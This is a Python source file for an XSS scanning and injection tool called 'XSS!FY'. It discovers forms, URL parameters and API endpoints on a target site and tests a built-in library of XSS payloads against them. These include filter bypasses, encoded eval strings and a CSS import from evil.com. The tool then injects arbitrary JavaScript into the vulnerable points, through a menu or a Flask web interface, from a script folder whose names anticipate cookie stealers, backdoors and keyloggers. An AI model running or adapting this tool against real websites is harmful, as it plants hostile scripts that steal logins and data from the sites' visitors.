#!/usr/bin/env python3
import requests as rq
import random as rd
import string as st
import re as regex
import json as js
import time as tm
import os as osys
import glob as gb
import base64 as b64
import hashlib as hl
import sys as sys
import subprocess as sp
from urllib.parse import urljoin as uj, urlparse as up, parse_qs as pq, urlencode as ue, quote as q, unquote as uq
from bs4 import BeautifulSoup as BS
import threading as th
from concurrent.futures import ThreadPoolExecutor as TPE, as_completed as af
from flask import Flask as Fk, render_template as rt, request as rqst, jsonify as jf, send_from_directory as sfd
import shutil as sh
from colorama import init as ci, Fore as F, Back as B, Style as S
ci(autoreset=True)
app = Fk(__name__)
class XSSifyScanner:
    def __init__(self,target_url,scripts_folder="Injection-Scripts"):
        self.target_url=target_url
        self.scripts_folder=scripts_folder
        self.session=rq.Session()
        self.vulnerable_points=[]
        self.found_vulnerabilities=[]
        self.stored_injection_points=[]
        self.headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','Accept-Language':'en-US,en;q=0.9','Accept-Encoding':'gzip, deflate, br','Connection':'keep-alive','Upgrade-Insecure-Requests':'1','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none'}
        self.payloads=self._generate_payload_library()
        self.script_library=self._load_script_library()
    def get_terminal_width(self):
        try:return sh.get_terminal_size().columns
        except:return 80
    def print_centered(self,text,color=F.WHITE,char='='):
        w=self.get_terminal_width()
        b=char*w
        p=(w-len(text))//2
        ct=' '*p+text
        print(color+b)
        print(color+ct)
        print(color+b)
    def create_dynamic_table(self,headers,data,colors=None):
        if not data:return"No data available"
        tw=self.get_terminal_width()
        nc=len(headers)
        cw=[]
        mcw=8
        for i,h in enumerate(headers):
            mcl=len(str(h))
            for row in data:
                if i<len(row):mcl=max(mcl,len(str(row[i])))
            cw.append(min(mcl+2,50))
        twd=sum(cw)+(3*(nc-1))
        if twd>tw:
            sf=tw/twd
            cw=[max(mcw,int(w*sf))for w in cw]
        tl=[]
        hl="┌"
        for i,width in enumerate(cw):
            hl+="─"*width
            if i<len(cw)-1:hl+="┬"
        hl+="┐"
        tl.append(F.CYAN+hl)
        hr="│"
        for i,(header,width)in enumerate(zip(headers,cw)):
            ht=str(header).center(width)
            hr+=F.YELLOW+ht+F.CYAN+"│"
        tl.append(hr)
        sep="├"
        for i,width in enumerate(cw):
            sep+="─"*width
            if i<len(cw)-1:sep+="┼"
        sep+="┤"
        tl.append(F.CYAN+sep)
        for ri,row in enumerate(data):
            rl="│"
            for i,(cell,width)in enumerate(zip(row,cw)):
                ct=str(cell)
                if len(ct)>width-2:ct=ct[:width-5]+"..."
                else:ct=ct.ljust(width)
                if colors and i<len(colors)and colors[i]:
                    try:ct=colors[i](ct)
                    except:pass
                elif"CRITICAL"in ct:ct=F.RED+S.BRIGHT+ct
                elif"HIGH"in ct:ct=F.RED+ct
                elif"MEDIUM"in ct:ct=F.YELLOW+ct
                elif"LOW"in ct:ct=F.GREEN+ct
                elif"Yes"in ct:ct=F.RED+S.BRIGHT+ct
                elif"No"in ct:ct=F.GREEN+ct
                rl+=ct+F.CYAN+"│"
            tl.append(rl)
        ft="└"
        for i,width in enumerate(cw):
            ft+="─"*width
            if i<len(cw)-1:ft+="┴"
        ft+="┘"
        tl.append(F.CYAN+ft)
        return"\n".join(tl)
    def display_banner(self):
        w=self.get_terminal_width()
        bl=["╔"+"═"*(w-2)+"╗","║"+" "*(w-2)+"║","║"+"XSS!FY - ADVANCED XSS SCANNING FRAMEWORK".center(w-2)+"║","║"+" "*(w-2)+"║","║"+"PROFESSIONAL SECURITY ASSESSMENT TOOL".center(w-2)+"║","║"+" "*(w-2)+"║","╚"+"═"*(w-2)+"╝"]
        print(F.MAGENTA+S.BRIGHT+"\n".join(bl))
        print()
    def _generate_payload_library(self):
        p=[]
        bv=['<script>alert(1)</script>','<script>prompt(1)</script>','<script>confirm(1)</script>','<img src=x onerror=alert(1)>','<svg onload=alert(1)>','<body onload=alert(1)>','<iframe src=javascript:alert(1)>','<embed src=javascript:alert(1)>','<object data=javascript:alert(1)>','<base href=javascript:alert(1)//>','<form><button formaction=javascript:alert(1)>X</button>','<input onfocus=alert(1) autofocus>','<textarea onfocus=alert(1) autofocus>','<keygen onfocus=alert(1) autofocus>','<video><source onerror=alert(1)>','<audio><source onerror=alert(1)>','<details ontoggle=alert(1)>','<select onfocus=alert(1)></select>',]
        av=['javascript:alert(1)','javascripT:alert(1)','JavaScript:alert(1)','jAvascript:alert(1)','javascript%3Aalert(1)','javascript&#58alert(1)','javascript&#0058alert(1)','javascript&#x3aalert(1)',]
        ev=['<script>eval(atob("YWxlcnQoMSk="))</script>','<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>','<script>\\u0061lert(1)</script>','<script>&#97lert(1)</script>','<script>&#x61lert(1)</script>','<img src=x onerror="&#x61;lert(1)">','<img src=x onerror="&#97;lert(1)">',]
        tv=['{{constructor.constructor("alert(1)")()}}','{{$eval.constructor("alert(1)")()}}','#{alert(1)}','${alert(1)}','#{7*7}','${7*7}',]
        dv=['<script>document.write("<script>alert(1)</script>")</script>','<script>document.writeln("<script>alert(1)</script>")</script>','<script>eval(location.hash.slice(1))</script>','<script>setTimeout("alert(1)")</script>','<script>setInterval("alert(1)")</script>','<script>Function("alert(1)")()</script>',]
        cv=['<div style="background:url(javascript:alert(1))">','<style>@import "javascript:alert(1)";</style>','<link rel=stylesheet href="javascript:alert(1)">','<style>body{background:url("javascript:alert(1)")}</style>','<style>@import"http://evil.com/xss.css";</style>',]
        bv2=['<scr<script>ipt>alert(1)</script>','<scri<script>pt>alert(1)</script>','<script x>alert(1)</script x>','<script/xxx>alert(1)</script>','<script>alert(1)//</script>','<<script>alert(1)</script>','<script>alert(1)<//script>','<script>alert(1)</script><script>','"><script>alert(1)</script>',"'><script>alert(1)</script>",'"></script><script>alert(1)</script>',"'></script><script>alert(1)</script>",'"><img src=x onerror=alert(1)>',"'><img src=x onerror=alert(1)>",'"><svg onload=alert(1)>',"'><svg onload=alert(1)>",]
        p.extend(bv)
        p.extend(av)
        p.extend(ev)
        p.extend(tv)
        p.extend(dv)
        p.extend(cv)
        p.extend(bv2)
        return list(set(p))
    def _load_script_library(self):
        if not osys.path.exists(self.scripts_folder):osys.makedirs(self.scripts_folder)
        s={}
        jf=gb.glob(osys.path.join(self.scripts_folder,"*.js"))
        for j in jf:
            sn=osys.path.basename(j).replace('.js','')
            try:
                with open(j,'r',encoding='utf-8')as f:s[sn]=f.read()
            except:s[sn]=''
        return s
    def _generate_random_string(self,length=10):
        return''.join(rd.choices(st.ascii_letters+st.digits,k=length))
    def discover_inputs(self):
        self.print_centered(f"SCANNING: {self.target_url}",F.BLUE)
        i_found=[]
        try:
            resp=self.session.get(self.target_url,headers=self.headers,timeout=15)
            soup=BS(resp.text,'html.parser')
            forms=soup.find_all('form')
            for f in forms:
                fa=f.get('action','')
                fm=f.get('method','get').lower()
                fi=f.find_all('input')
                ft=f.find_all('textarea')
                fs=soup.find_all('select')
                fd={}
                for i in fi:
                    iname=i.get('name','')
                    if iname and i.get('type')not in['submit','button']:fd[iname]=f"TEST_{self._generate_random_string()}"
                for t in ft:
                    tn=t.get('name','')
                    if tn:fd[tn]=f"TEST_{self._generate_random_string()}"
                for s in fs:
                    sn=s.get('name','')
                    if sn:fd[sn]=f"TEST_{self._generate_random_string()}"
                if fd:
                    full_a=uj(self.target_url,fa)
                    i_found.append({'type':'form','action':full_a,'method':fm,'data':fd,'is_storage':self._is_storage_form(f,fd),'danger_level':self._assess_danger_level(f,fd)})
            purl=up(self.target_url)
            uparam=pq(purl.query)
            if uparam:
                i_found.append({'type':'url_params','url':self.target_url,'params':{k:f"TEST_{self._generate_random_string()}"for k in uparam.keys()},'is_storage':False,'danger_level':'MEDIUM'})
            scripts=soup.find_all('script')
            for sc in scripts:
                if sc.string:
                    ap=regex.findall(r'["\'](/?api/[^"\']+)["\']',sc.string)
                    aj=regex.findall(r'["\'](/?ajax/[^"\']+)["\']',sc.string)
                    jp=regex.findall(r'["\'](/?json/[^"\']+)["\']',sc.string)
                    ae=ap+aj+jp
                    for e in ae:
                        i_found.append({'type':'api_endpoint','url':uj(self.target_url,e),'method':'post','data':{'test':f"TEST_{self._generate_random_string()}"},'is_storage':True,'danger_level':'HIGH'})
            jc=regex.findall(r'fetch\([^)]*\.json[^)]*\)',resp.text,regex.IGNORECASE)
            jc.extend(regex.findall(r'\.post\([^)]*\.json[^)]*\)',resp.text,regex.IGNORECASE))
            for c in jc:
                jm=regex.findall(r'["\']([^"\']*\.json)["\']',c)
                for je in jm:
                    i_found.append({'type':'json_endpoint','url':uj(self.target_url,je),'method':'post','data':{'test':f"TEST_{self._generate_random_string()}"},'is_storage':True,'danger_level':'CRITICAL'})
            ws=regex.findall(r'["\'](wss?://[^"\']+)["\']',resp.text)
            for w in ws:
                i_found.append({'type':'websocket','url':w,'method':'ws','data':{'test':f"TEST_{self._generate_random_string()}"},'is_storage':True,'danger_level':'HIGH'})
            print(F.GREEN+f"[+] Found {len(i_found)} potential injection points")
            return i_found
        except Exception as e:
            print(F.RED+f"[-] Scan error: {e}")
            return[]
    def _is_storage_form(self,form,form_data):
        fh=str(form).lower()
        si=['comment','post','message','review','feedback','profile','bio','description','content','submit','create','update','save','store','register','signup','login','contact','support','ticket']
        for i in si:
            if i in fh:return True
        return False
    def _assess_danger_level(self,form,form_data):
        fh=str(form).lower()
        ci=['password','login','signin','register','credit','card','bank','account','email','username']
        for i in ci:
            if i in fh:return'CRITICAL'
        if self._is_storage_form(form,form_data):return'HIGH'
        return'MEDIUM'
    def test_payload(self,input_point,payload):
        try:
            if input_point['type']=='form':
                if input_point['method']=='get':
                    resp=self.session.get(input_point['action'],params={k:payload for k in input_point['data'].keys()},headers=self.headers,timeout=10,allow_redirects=True)
                else:
                    resp=self.session.post(input_point['action'],data={k:payload for k in input_point['data'].keys()},headers=self.headers,timeout=10,allow_redirects=True)
            elif input_point['type']=='url_params':
                tu=input_point['url'].split('?')[0]+'?'+ue({k:payload for k in input_point['params'].keys()})
                resp=self.session.get(tu,headers=self.headers,timeout=10,allow_redirects=True)
            elif input_point['type']in['api_endpoint','json_endpoint']:
                resp=self.session.post(input_point['url'],json={k:payload for k in input_point['data'].keys()},headers=self.headers,timeout=10,allow_redirects=True)
            if payload in resp.text:return True,resp.url,'DIRECT'
            ep=payload.replace('<','&lt;').replace('>','&gt;')
            if ep in resp.text:return True,resp.url,'ENCODED'
            for part in payload.split('>'):
                if part and part in resp.text:return True,resp.url,'PARTIAL'
            if payload.lower()in resp.text.lower():return True,resp.url,'CASE_INSENSITIVE'
        except Exception as e:pass
        return False,None,None
    def scan_for_vulnerabilities(self,max_workers=10):
        ip=self.discover_inputs()
        if not ip:
            print(F.RED+"[-] No injection points found")
            return[]
        print(F.CYAN+f"[*] Testing {len(self.payloads)} payloads across {len(ip)} points...")
        vf=[]
        def test_ip(ipoint):
            pv=[]
            for p in self.payloads:
                iv,vu,rt=self.test_payload(ipoint,p)
                if iv:
                    pv.append({'input_point':ipoint,'payload':p,'url':vu,'type':'xss','is_stored':ipoint.get('is_storage',False),'danger_level':ipoint.get('danger_level','MEDIUM'),'reflection_type':rt,'impact':self._calculate_impact(ipoint,p)})
                    break
            return pv
        with TPE(max_workers=max_workers)as executor:
            ftp={executor.submit(test_ip,point):point for point in ip}
            for f in af(ftp):
                pv=f.result()
                vf.extend(pv)
                if pv:
                    v=pv[0]
                    c=F.RED if v['danger_level']=='CRITICAL'else F.YELLOW
                    print(c+f"[+] Vulnerability: {v['input_point']['type']} - {v['danger_level']}")
        self._display_vulnerabilities_table(vf)
        self.found_vulnerabilities=vf
        return vf
    def _display_vulnerabilities_table(self,vulnerabilities):
        if not vulnerabilities:
            self.print_centered("NO VULNERABILITIES FOUND",F.RED)
            return
        td=[]
        for i,v in enumerate(vulnerabilities,1):
            du=v['url']
            if len(du)>60:du=du[:30]+"..."+du[-30:]
            td.append([i,v['input_point']['type'].upper(),v['danger_level'],"Yes"if v['is_stored']else"No",v['reflection_type'],v['impact'],du])
        h=["#","Type","Level","Stored","Reflection","Impact","URL"]
        def cl(text):
            if"CRITICAL"in text:return F.RED+S.BRIGHT+text
            elif"HIGH"in text:return F.RED+text
            elif"MEDIUM"in text:return F.YELLOW+text
            else:return F.GREEN+text
        def cs(text):
            if"Yes"in text:return F.RED+S.BRIGHT+text
            else:return F.GREEN+text
        def ci(text):
            if"HIGH"in text:return F.RED+S.BRIGHT+text
            elif"MEDIUM"in text:return F.YELLOW+text
            else:return F.GREEN+text
        co=[None,cl,cl,cs,None,ci,None]
        self.print_centered("DETECTED VULNERABILITIES",F.GREEN)
        print(self.create_dynamic_table(h,td,co))
        cc=len([v for v in vulnerabilities if v['danger_level']=='CRITICAL'])
        sc=len([v for v in vulnerabilities if v['is_stored']])
        hi=len([v for v in vulnerabilities if v['impact']=='HIGH'])
        print(F.CYAN+"\n"+"═"*self.get_terminal_width())
        print(F.YELLOW+S.BRIGHT+"SCAN SUMMARY:")
        print(f"  {F.CYAN}Total Vulnerabilities: {len(vulnerabilities)}")
        print(f"  {F.RED+S.BRIGHT}Critical Issues: {cc}")
        print(f"  {F.RED if sc>0 else F.GREEN}Stored XSS: {sc}")
        print(f"  {F.YELLOW if hi>0 else F.GREEN}High Impact: {hi}")
        print(F.CYAN+"═"*self.get_terminal_width())
    def _calculate_impact(self,input_point,payload):
        if input_point.get('is_storage',False):return'HIGH'
        if input_point.get('danger_level')=='CRITICAL':return'HIGH'
        if'password'in str(input_point).lower()or'login'in str(input_point).lower():return'HIGH'
        return'MEDIUM'
    def list_available_scripts(self):
        sn=list(self.script_library.keys())
        if not sn:
            print(F.YELLOW+"[-] No scripts available")
            return[]
        td=[]
        for i,name in enumerate(sn,1):
            rl="HIGH"if any(x in name for x in['cookie','backdoor','keylogger'])else"MEDIUM"
            d=name.replace('_',' ').title()
            td.append([i,d,rl])
        h=["#","Script Name","Risk Level"]
        def cr(text):
            if"HIGH"in text:return F.RED+S.BRIGHT+text
            else:return F.YELLOW+text
        co=[None,None,cr]
        self.print_centered("AVAILABLE SCRIPTS",F.BLUE)
        print(self.create_dynamic_table(h,td,co))
        return sn
    def list_advanced_scripts(self):
        sn=list(self.script_library.keys())
        td=[]
        for i,name in enumerate(sn,1):
            td.append([i,name.replace('_',' ').title(),"ADVANCED"])
        h=["#","Script Name","Type"]
        self.print_centered("ADVANCED SCRIPTS",F.MAGENTA)
        print(self.create_dynamic_table(h,td))
        return sn
    def inject_script(self,vulnerability,script_content,script_name="CUSTOM"):
        ip=f'<script>{script_content}</script>'
        print(F.CYAN+f"[*] Injecting {script_name} into {vulnerability['url']}")
        try:
            if vulnerability['input_point']['type']=='form':
                if vulnerability['input_point']['method']=='get':
                    resp=self.session.get(vulnerability['input_point']['action'],params={k:ip for k in vulnerability['input_point']['data'].keys()},headers=self.headers)
                else:
                    resp=self.session.post(vulnerability['input_point']['action'],data={k:ip for k in vulnerability['input_point']['data'].keys()},headers=self.headers)
            elif vulnerability['input_point']['type']=='url_params':
                tu=vulnerability['url'].split('?')[0]+'?'+ue({k:ip for k in vulnerability['input_point']['params'].keys()})
                resp=self.session.get(tu,headers=self.headers)
            print(F.GREEN+f"[+] {script_name} injected successfully")
            print(F.CYAN+f"[+] Payload URL: {resp.url}")
            return True
        except Exception as e:
            print(F.RED+f"[-] Injection failed: {e}")
            return False
    def interactive_mode(self):
        self.display_banner()
        self.print_centered("INTERACTIVE MODE - XSS!FY",F.GREEN)
        v=self.scan_for_vulnerabilities()
        if not v:
            print(F.YELLOW+"[-] No vulnerabilities found - target may be secure")
            return
        while True:
            print(F.CYAN+"\n"+"═"*self.get_terminal_width())
            print(F.YELLOW+S.BRIGHT+"XSS!FY OPTIONS MENU:")
            print(F.CYAN+"═"*self.get_terminal_width())
            print(F.WHITE+"  1. Select script from library")
            print(F.WHITE+"  2. Enter custom script")
            print(F.WHITE+"  3. Show vulnerability details")
            print(F.WHITE+"  4. Rescan target")
            print(F.WHITE+"  5. Exit")
            print(F.CYAN+"═"*self.get_terminal_width())
            ch=input(F.GREEN+"\nSelect option (1-5): ").strip()
            if ch=='1':
                sn=self.list_available_scripts()
                if not sn:continue
                try:
                    sc=int(input(F.GREEN+"Select script number: "))-1
                    if 0<=sc<len(sn):
                        ss=sn[sc]
                        sc_content=self.script_library[ss]
                        print(F.CYAN+"\nSelect vulnerability to target:")
                        for i,vuln in enumerate(v,1):
                            c=F.RED if vuln['danger_level']=='CRITICAL'else F.YELLOW
                            print(f"  {c}{i}. {vuln['input_point']['type']} - {vuln['danger_level']}")
                        vc=int(input(F.GREEN+"Select target: "))-1
                        if 0<=vc<len(v):self.inject_script(v[vc],sc_content,ss)
                        else:print(F.RED+"[-] Invalid target")
                    else:print(F.RED+"[-] Invalid script")
                except ValueError:print(F.RED+"[-] Please enter a valid number")
            elif ch=='2':
                print(F.CYAN+"\nEnter custom JavaScript (end with empty line):")
                l=[]
                while True:
                    li=input(F.WHITE+"> ")
                    if li=="":break
                    l.append(li)
                cs='\n'.join(l)
                print(F.CYAN+"\nSelect vulnerability to target:")
                for i,vuln in enumerate(v,1):
                    c=F.RED if vuln['danger_level']=='CRITICAL'else F.YELLOW
                    print(f"  {c}{i}. {vuln['input_point']['type']} - {vuln['danger_level']}")
                vc=int(input(F.GREEN+"Select target: "))-1
                if 0<=vc<len(v):self.inject_script(v[vc],cs,"CUSTOM")
                else:print(F.RED+"[-] Invalid target")
            elif ch=='3':self._display_vulnerabilities_table(v)
            elif ch=='4':
                print(F.CYAN+"[*] Rescanning target...")
                v=self.scan_for_vulnerabilities()
            elif ch=='5':
                self.print_centered("THANK YOU FOR USING XSS!FY",F.MAGENTA)
                break
            else:print(F.RED+"[-] Invalid option")
def main():
    if len(sys.argv)>1 and sys.argv[1]=='web':
        print(F.CYAN+"[*] Starting web interface...")
        print(F.CYAN+"[*] Web interface available at: http://localhost:5000")
        app.run(debug=True,host='0.0.0.0',port=5000)
        return
    tu=input(F.GREEN+"Enter target URL: ").strip()
    scanner=XSSifyScanner(tu)
    scanner.interactive_mode()
scanner_instance=None
@app.route('/')
def index():
    return rt('index.html')
@app.route('/scan',methods=['POST'])
def scan():
    global scanner_instance
    data=rqst.json
    tu=data.get('target_url')
    if not tu:return jf({'error':'No target URL provided'}),400
    try:
        scanner_instance=XSSifyScanner(tu)
        v=scanner_instance.scan_for_vulnerabilities()
        r={'vulnerabilities':v,'total':len(v),'critical':len([v for v in v if v['danger_level']=='CRITICAL']),'stored':len([v for v in v if v['is_stored']])}
        return jf(r)
    except Exception as e:return jf({'error':str(e)}),500
@app.route('/scripts')
def get_scripts():
    global scanner_instance
    if not scanner_instance:return jf({'error':'No scanner instance'}),400
    s=scanner_instance.list_available_scripts()
    as_=scanner_instance.list_advanced_scripts()
    return jf({'scripts':s,'advanced_scripts':as_})
@app.route('/inject',methods=['POST'])
def inject():
    global scanner_instance
    data=rqst.json
    vi=data.get('vulnerability_index')
    sn=data.get('script_name')
    sc=data.get('script_content','')
    if not scanner_instance or not scanner_instance.found_vulnerabilities:return jf({'error':'No vulnerabilities found'}),400
    try:
        v=scanner_instance.found_vulnerabilities[vi]
        if sc:su=scanner_instance.inject_script(v,sc,"CUSTOM")
        else:
            sc=scanner_instance.script_library.get(sn,'')
            su=scanner_instance.inject_script(v,sc,sn)
        return jf({'success':su})
    except Exception as e:return jf({'error':str(e)}),500
@app.route('/status')
def status():
    global scanner_instance
    if scanner_instance and scanner_instance.found_vulnerabilities:
        return jf({'status':'ready','vulnerabilities_count':len(scanner_instance.found_vulnerabilities)})
    return jf({'status':'idle'})
if __name__=="__main__":main()